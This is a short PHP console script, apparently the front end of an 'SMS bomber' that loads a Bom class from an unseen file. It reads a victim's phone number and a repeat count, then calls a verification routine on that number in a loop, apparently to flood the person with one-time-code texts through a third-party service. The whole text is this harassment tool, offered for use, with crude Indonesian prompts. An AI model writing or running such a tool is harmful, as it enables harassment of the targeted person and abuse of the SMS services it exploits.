<?php
include 'bomhooq.php';

/*
    https://github.com/nee48/BomSmsHooq
    Made by Handika Pratama
    Modified by まやちゃん
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor Yg Luck Nutc\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Tai\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
